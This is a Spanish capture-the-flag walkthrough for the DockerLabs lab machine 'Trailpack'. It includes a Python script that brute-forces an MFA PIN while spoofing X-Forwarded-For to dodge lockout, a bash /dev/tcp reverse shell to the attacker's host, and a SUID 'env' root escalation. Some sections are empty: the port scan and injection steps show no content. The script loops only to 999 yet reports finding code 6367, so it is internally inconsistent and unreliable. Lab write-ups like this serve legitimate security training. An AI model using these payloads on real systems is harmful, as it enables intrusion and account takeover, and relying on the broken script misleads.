## Introducción

Este documento presenta la resolución completa de la máquina **Trailpack**, desarrollada por *El Pingüino de Mario* para la plataforma **DockerLabs**, clasificada con una dificultad **Media**.
El laboratorio expone un servidor web en el puerto 8000 con un sistema de autenticación que incluye un código MFA de 4 dígitos. Mediante el uso de la cabecera `X-Forwarded-For` para evadir el bloqueo por intentos fallidos, se realiza un ataque de fuerza bruta para obtener el código MFA y acceder al panel de usuario.
El panel contiene un formulario de atención al cliente vulnerable a **inyección de comandos**, permitiendo ejecutar una reverse shell como el usuario `balutron`. Una vez dentro, se identifica que el binario `env` tiene permisos SUID, facilitando una escalada de privilegios directa a `root`.
Todo el proceso se llevó a cabo dentro de un entorno controlado con fines estrictamente educativos.

## Paso 0 — Despliegue y preparación

Se descomprime la máquina y se despliega utilizando el script proporcionado:

```bash
unzip Trailpack.zip
sudo bash auto_deploy.sh Trailpack.tar
```

Una vez iniciado el contenedor, se asigna la dirección IP correspondiente.

![IP asignada](https://res.cloudinary.com/dewqswzke/image/upload/v1762582724/Ip_qrhpof.png)

Se organiza el entorno de trabajo para mantener una estructura clara durante el análisis:

```bash
mkdir -p Trailpack/{content,exploits,nmap,scripts}
cd Trailpack
```

## Paso 1 — Reconocimiento

### 1.1 Escaneo de puertos

Se realiza un escaneo completo de puertos TCP para identificar servicios expuestos:


### 2.1 Registro de usuario

Se registra un nuevo usuario con datos de prueba.

### 2.2 Fuerza bruta MFA

El sistema requiere un código MFA de 4 dígitos. Se utiliza la cabecera `X-Forwarded-For` para evadir el bloqueo por intentos fallidos.

**Script de fuerza bruta:**

```python
import requests

for i in range(0,1000):
    burp0_url = "http://172.17.0.2:8000/verify-mfa"
    burp0_cookies = {"session_id": "SSESIONID"}
    burp0_headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:152.0) Gecko/20100101 Firefox/152.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": "http://172.17.0.2:8000",
        "Sec-GPC": "1",
        "Connection": "keep-alive",
        "Referer": "http://172.17.0.2:8000/verify-mfa",
        "X-Forwarded-For": f"172.0.0.{i}",
        "Upgrade-Insecure-Requests": "1",
        "Priority": "u=0, i"
    }
    burp0_data = {"pin": f"{i:04d}"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)

    if not "Código incorrecto." in r.text:
        print("OTP--> " + str(i))
        break
```

El código MFA es `6367`.

### 2.3 Inyección de comandos

En el dashboard, un formulario de atención al cliente es vulnerable a inyección de comandos:

### 2.4 Reverse shell

Se inicia un listener:

```bash
nc -nlvp 443
```

Se ejecuta el payload:

```
bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"
```

## Paso 3 — Escalada de privilegios

### 3.1 De balutron → root

Se buscan binarios con permisos SUID:

```bash
find / -perm -4000 2>/dev/null
```

![Find](https://res.cloudinary.com/dewqswzke/image/upload/v1783629765/Find_dlfd85.png)

Se identifica que `env` tiene permisos SUID:

```bash
env /bin/bash -p
```
